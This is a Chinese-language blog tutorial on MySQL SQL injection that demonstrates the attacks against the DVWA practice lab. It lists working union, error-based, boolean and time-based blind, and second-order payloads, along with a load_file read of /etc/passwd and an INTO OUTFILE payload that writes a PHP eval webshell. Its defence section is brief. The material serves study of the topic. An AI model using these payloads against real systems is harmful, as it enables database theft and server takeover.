---
title: SQL注入相关
toc: true
date: 2021-05-11 15:23:06
tags:
- web漏洞
- MySQL
categories:
- web安全漏洞篇
---

## 序

### 1. 什么是SQL

SQL是结构化查询语言(Structured Query Language)简称，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；

### 2. 什么是SQL注入

- SQL注入是一种利用用户输入构造SQL语句的攻击。
- 如果Web应用没有适当的验证用户输入的信息，攻击者就有可能改变后台执行的SQL语句的结构。由于程序运行SQL语句时的权限与当前该组建（例如，数据库服务器、Web应用服务器、Web服务器等）的权限相同，而这些组件一般的运行权限都很高，而且经常是以管理员的权限运行，所以攻击者获得数据库的完全控制，并可能执行系统命令。
- 本质是用户输入作为**SQL**命令被执行 

### 3. SQL注入危害

- 获取账户密码等敏感信息
- 结合读写权限,写入WebShell
- ...



**学习参考:**

https://www.bugbank.cn/q/article/58afc3c06ef394d12a8a4379.html

*<!-- more -->* 

### 4. 常见数据库

1. MS SQL 
2. MySQL 开源免费
3. Access
4. Oracle 性能高 价格贵









## 常用命令语句

> 这里使用MySQL的命令为例,参考菜鸟教程
>
> https://www.runoob.com/mysql/mysql-tutorial.html

### 1. 命令语句

**库、表操作**

```mysql
查看所有数据库
show databases;
选择数据库(use+数据库名)
如: use mysql;
查看数据库的数据表
show tables;
查看数据表字段描述(desc+数据表名)
如: desc user；

创建数据库
CREATE DATABASE 数据库名;

创建数据表(需要先使用use 指定数据库)
CREATE TABLE table_name (column_name column_type);
```

**查询数据表语句**

```mysql
SELECT column_name1,column_name2 FROM table_name [WHERE Clause] [LIMIT N][ OFFSET M]

如
select * from user;
select User,Select_priv from user;
select User,Select_priv from user where Select_priv="N";
select User,Select_priv from user where Select_priv="N" limit 2;
select User,Select_priv from user where Select_priv="N" limit 2 offset 0;
```

- 查询语句中你可以使用一个或者多个表，表之间使用逗号(,)分割，并使用WHERE语句来设定查询条件。
- SELECT 命令可以读取一条或者多条记录。
- 你可以使用星号（*）来代替其他字段，SELECT语句会返回表的所有字段数据
- 你可以使用 WHERE 语句来包含任何条件。
- 你可以使用 LIMIT 属性来设定返回的记录数。
- 你可以通过OFFSET指定SELECT语句开始查询的数据偏移量。默认情况下偏移量为0



**UNION联合查询**

```mysql
SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions]
UNION [ALL | DISTINCT]
SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions];

select User from tables_priv union select User from user;
select User from tables_priv union select 1,2,3,4,5,6,7,8;
```

- **expression1, expression2, ... expression_n**: 要检索的列。
- **tables:** 要检索的数据表。
- **WHERE conditions:** 可选， 检索条件。
- **DISTINCT:** 可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。
- **ALL:** 可选，返回所有结果集，包含重复数据。



- 联合的两个表字段数必须相同，不然会产生错误,因此可以使用union select 1,2,3,4,5... 不断尝试进行字段猜解



> 只写出用到的,其他语句请参考
>
> https://www.runoob.com/mysql/mysql-tutorial.html



### 2. 内置函数

> SQL注入可以使用函数进行报错注入、延时注入、文件读写等
>
> http://c.biancheng.net/mysql/function/

**获取系统信息**

- system_user() 返回MySQL连接的当前用户名和主机名
- user()  用户名
- current_user()  当前用户名
- session_user()  连接数据库的用户名
- database()  数据库名
- version()  数据库版本
- @@datadir 数据库路径
- @@basedir  数据库安装路径
- @@version_compile_os  操作系统



----

**字符串函数**

- CONCAT(s1，s2，...) 合并字符串函数，返回结果为连接参数产生的字符串，参数可以使一个或多个。如:
  `select concat((select User from user limit 1 offset 0),(select User from user limit 1 offset 1),(select User from user limit 1 offset 2));` 
- LOWER( )	将字符串中的字母转换为小写
- UPPER( )	将字符串中的字母转换为大写
- LEFT(s，n) 函数返回字符串 s 最左边的 n 个字符。
- RIGHT(s，n)返回字符串 s 最右边边的 n 个字符。
- TRIM( )	删除字符串左右两侧的空格
- SUBSTR(s，n，len) ，从字符串 s 返回一个长度同 len 字符相同的子字符串，起始于位置 n。



---

**其他函数**

- SLEEP(N) 等待 N秒
- IF(expr,v1,v2) 如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。如
  `select IF(SUBSTRING((select User from user limit 1),1,1)='d',sleep(1),1);`
  该语句从获取User表中User列第一个数据的第一个值,并和d作比较,如果相等sleep 6秒, 否则直接返回, 用于延时注入 
- updatexml (XML_document, XPath_string, new_value); 改变文档中符合条件的节点的值。找不到传入的Xpath值会报错,如
  ` select * from user where 1=1 and updatexml(1,concat('~',@@version,'~'),2);`
  该语句中重点是and后面的语句, update无法匹配到正确的Xpath，但是会将括号内的执行结果以错误的形式报出,用于报错注入
- exp(X)此函数返回e(自然对数的底)的X次方的值。如果传入的X值溢出会报错。如
  ` select exp(~(select*from(select user())x)); ` （不过在我的8.0.23版本MySQL上测试失败)
- rand(x)取随机数，若有参数x，则每个x对应一个固定的值，如果连续多次执行会变化，但是可以预测
- floor 返回**小于等于**该值的最大整数.







### 3. 其他补充



**Mysql中的四种注释符号**

1.  --(后面跟上空格) 
   注:在url输入通常为--+  ，即使用+号替代空格
2. /*  注释内容 */
3. /*!注释内容 */
   这种注释在mysql中叫做内联注释，当！后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。
4. #



**desc  数据表**

获取指定表的字段信息

如desc user;



**order by num**

order by 会根据后面的值作为参考,对结果进行排序。

如 order by 2 会按照第二列进行排序

如果num 的值超过结果的字段数会报错。





**查询其他数据库中的数据**

通常需要使用 use 命令指定一个数据库后 才能对数据库中的表进行操作。

可以通过 ` 数据库名.表名` 对其他数据库中的表进行操作





**information_schema数据库**

是mysql自带的数据库。存储着所有数据库 、数据表、数据列、用户等信息。

在SQL注入中常用的表为SCHEMATA表、TABLES表、COLUMNS表

具体表如下: 

- SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。
- TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。
- COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。
- STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。
- USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。
- SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。
- TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。
- COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。
- CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。
- COLLATIONS表：提供了关于各字符集的对照信息。
- COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。
- TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。
- KEY_COLUMN_USAGE表：描述了具有约束的键列。
- ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。
- VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。
- TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表





## 常见注入分类

### 1. 数字型注入和字符型注入

**两种注入区别**

```mysql
数字型注入查询语句
select * from user where passwd=1;
字符型注入查询语句
select * from user where passwd='1';

两者的主要区别是, 字符型注入在实际操作的时候需要考虑到引号的闭合
如
数字型注入
select * from user where passwd=-1 union select passwd from user;
其payload为: -1 union select passwd from user
字符型注入
select * from user where passwd='-1' union select passwd from user -- ';
其payload为: -1' union select passwd from user -- '
```

**如何判断数字型注入和字符型注入**

通过使用逻辑运算符判断

```mysql
数字型注入
select * from user where passwd=1; #正常返回
select * from user where passwd=1 and 1=1; # 跟上一个返回同样结果
select * from user where passwd=1 and 1=2; # 返回为空

字符型注入
select * from user where passwd='1';
select * from user where passwd='1 and 1=1';# 使用数字型注入的Payload返回空
select * from user where passwd='1' and '1'='1'; # 返回正常页面,则为字符型注入(注意最后的单引号闭合)
select * from user where passwd='1' and 1=1 -- '; #也可使用 注释符号去掉单引号
```



**注**

如果查询语句条件的值使用引号，而值对应的字段的具体的类型为数字型(int 等),情况较为特殊，参考最下文的补充







### 2. 可回显注入



**联合查询注入**

> 当我们查询的数据库信息会回显到浏览器上时,考虑使用联合查询注入
>
> 流程:
>
> 1. 



> 这里使用dvwa  low难度进行具体的演示
>
> 关键查询语句为
>
> ` $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; `
>
> 输入 1
>
> ![image-20210516112342059](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210516112342059.png)
>
> 判断是否为字符型
>
> ... 略  源代码为字符型
>
> 注意, 下面的输入 在 -- 后面都有空格
>
> 判断显示字段( -1' union select 1,2 --  )
>
> ![image-20210516124646448](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210516124646448.png)
>
> 使用自带函数获取敏感信息(-1' union select database(),@@datadir --  )
>
> ![image-20210516124826965](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210516124826965.png)
>
> ***
>
> 开始手工获取信息
>
> 1. 获取数据库信息( 通过更改offset的值遍历数据库)
>
>    在information_schema.SCHEMATA的SCHEMA_NAME列存储的是数据库的名字
>    -1' union select (select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 0),2 -- 
>    -1' union select (select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 1),2 -- 
>    -1' union select (select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 2),2 -- 
>
>    ![image-20210516134928345](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210516134928345.png)
>
> 2. 从dvwa数据库中获取数据表信息
>    -1' union select (select table_name from information_schema.tables where TABLE_SCHEMA='dvwa' limit 1 offset 0),2 -- 
>    -1' union select (select table_name from information_schema.tables where TABLE_SCHEMA='dvwa' limit 1 offset 1),2 --
>    ![image-20210516140446014](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210516140446014.png) 
>
> 3. 获取guestbook数据表的字段信息
>    -1' union select (select column_name from information_schema.columns where TABLE_NAME='guestbook' limit 1 offset 1),2 --
>    ![image-20210516140730824](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210516140730824.png)
>
> 4. 获取该列具体数据(此时已知了数据库、表等信息可直接查询)
>    -1' union select (select comment from dvwa.guestbook limit 1 offset 0),2 --
>    ![image-20210516140952510](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210516140952510.png)

----



**报错注入**



当我们在应用中输入异常数据、或者使用内置函数报错导致SQL语句执行失败时，有的时候web服务器会返回错误信息。

报错注入的本质是

1. 传入的参数中包含了内置函数
2. 内置函数的参数为获取信息的语句
3. 函数执行失败
4. web服务器返回报错

在dvwa中输入`1' and updatexml(1,concat(0x7e,(select user()),0x7e),1) -- `

数据库会将`concat(0x7e,(select user()),0x7e)` 的结果值作为xmlpath,因为找不到这一路径导致报错

![image-20210516221459561](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210516221459561.png)

将concat中的select user() 换成其他的值即可进行报错注入

```mysql
#获取数据库
1' and updatexml(1,concat(0x7e,(select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 0),0x7e),1) -- 

#获取数据表
1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where TABLE_SCHEMA='dvwa' limit 1 offset 0),0x7e),1) -- 

#获取列
1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where TABLE_NAME='guestbook' limit 1 offset 1),0x7e),1) -- 

#获取信息
1' and updatexml(1,concat(0x7e,(select comment from dvwa.guestbook limit 1 offset 0),0x7e),1) -- 


```

常用函数以及payload

- floor()  #原理较为复杂,建议研究一下
  
  https://www.cnblogs.com/sfriend/p/11365999.html
  `1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --`
- extractvalue()
  `1' and extractvalue(1,concat(0x7e,(select user()),0x7e)) --`
- updatexml()
  `1' and updatexml(1,concat(0x7e,(select user()),0x7e),1) --`
- geometrycollection()
  `1' and geometrycollection((select * from(select * from(select user())a)b)) --`
- multipoint()
  `1' and  multipoint((select * from(select * from(select user())a)b)) --`
- polygon()
  `1' and polygon((select * from(select * from(select user())a)b)) --`
- multipolygon()
  `1' and  multipolygon((select * from(select * from(select user())a)b)) --`
- linestring()
  `1' and linestring((select * from(select * from(select user())a)b)) --`
- multilinestring()
  `1' and multilinestring((select * from(select * from(select user())a)b)) --`
- exp()
  `1' and exp(~(select * from(select user())a)) --`

----



**堆叠注入**

堆叠注入的产生原因是一次执行多条SQL语句。

堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。

如在PHP中，`mysqli_multi_query()`函数可以多语句查询SQL。



在正常应用中出现的可能性较低。

https://blog.csdn.net/weixin_45146120/article/details/101037211



------



### 3. 无回显注入



> 有的时候,服务器端并不会返回查询结果给客户端,这时候就不能直接通过SQL注入获取信息,
>
> 可以考虑通过条件语句判断，根据服务器返回情况进行数据猜解。
>
> 这种注入需要逐个字符地猜解,因此速度较慢。



**基于布尔注入**

Bool盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页中真和假有着不同的回显，比如为真时返回access,为假时返回false;或者为真时返回正常页面，为假时跳转到错误页面等。

构造Payload的思路: 

1. 要获取的目标数据的语句. 如`select password from user limit 1` ， 又或是函数 `user()`;
2. 截取其中的字符, 使用 `substr` ， `left` , `right` 等函数, 如 `substr(user(),1,1)`;
3. 进一步处理截取结果: 为了编写脚本方便. 可以将截取结果转换为16进制或ASCLL码对应的数字值,如`ascii(substr(user(),1,1))`
4. 比较字符  `if(ascii(substr(user(),1,1))=96,1,0)` 相等则为true 不相等为false
5. 拼接payload `1' and if(ascii(substr(user(),1,1))=96,1,0) -- `
   ![image-20210520155335091](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210520155335091.png)
6. 在脚本中最好使用二分法猜解字符



**基于延时注入**



有时候SQL注入不仅没有回显,服务器也不会根据条件返回不同的页面，这时候考虑延时注入。

延时注入可以使用sleep或者benchmark等函数



他们的使用类似布尔注入，只需将IF中的返回结果替换即可

如

` 1' and if(ascii(substr(user(),1,1))=97,sleep(4),0) --  `



### 4. 二次注入

二次注入是通过与数据库服务器进行交互的过程再次进行注入

如已知管理员用户为admin

修改密码的SQL语句为 `update users set password='__ ' where username ='__ 'and password='__ ';`

注册账号 admin' -- -  密码123456

登录该账号，修改密码 为1111

提交修改密码执行的语句为 `update users set password='1111' where username ='admin' -- - and password='123456';`

因为注释的原因实际执行的语句为 ` update users set password='1111' where username ='admin'`



### 5. 通过SQL注入读写文件

> 关于各种权限
>
> https://www.jb51.net/article/65645.htm



**读文件Payload**

`1' union select 1,load_file("/etc/passwd") -- `

![image-20210520163309519](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210520163309519.png)

**写文件Payload**

通过写文件 可以写入一个webshell,前提是能够获得web服务的路径

```mysql
1' union select 1,"<?php @eval($_GET[x]);?>",3,4,5 into outfile 'C:/Inetpub/wwwroot/cc.php'
```



## 防御SQL注入

### 1. 过滤敏感参数

- 黑名单
- 白名单

### 2. 使用参数化查询



## 其他补充

### 1.关于字段类型

在dvwa low测试中

输入 1 和 1+字符串(如1a , 1aaaaaa) 返回结果相同

而查询语句为

```mysql
SELECT first_name, last_name FROM users WHERE user_id = '1';
SELECT first_name, last_name FROM users WHERE user_id = '1a';
SELECT first_name, last_name FROM users WHERE user_id = '1aaaaaaa';
```

查看数据库描述

![image-20210516113943902](F:\hexo\source\_posts\web安全漏洞篇\png\img2\image-20210516113943902.png)

发现 user_id字段的类型为int类型

Mysql 对于数字类型的值查询 ，如果加了单引号会将其转换为数字类型 具体转换规则 ...

